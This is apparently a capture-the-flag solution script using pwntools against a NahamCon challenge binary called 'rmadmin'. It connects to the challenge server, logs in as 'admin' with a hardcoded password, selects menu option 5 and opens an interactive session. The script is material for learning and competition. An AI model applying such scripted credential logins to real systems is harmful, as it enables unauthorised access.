from pwn import *

e = ELF("./rmadmin")

context.binary = e.path

p = remote("challenge.nahamcon.com", 30433)

p.sendlineafter(":", "admin")
p.sendlineafter(":", "1q2w3e4r")

p.sendlineafter(">", "5")

p.interactive()
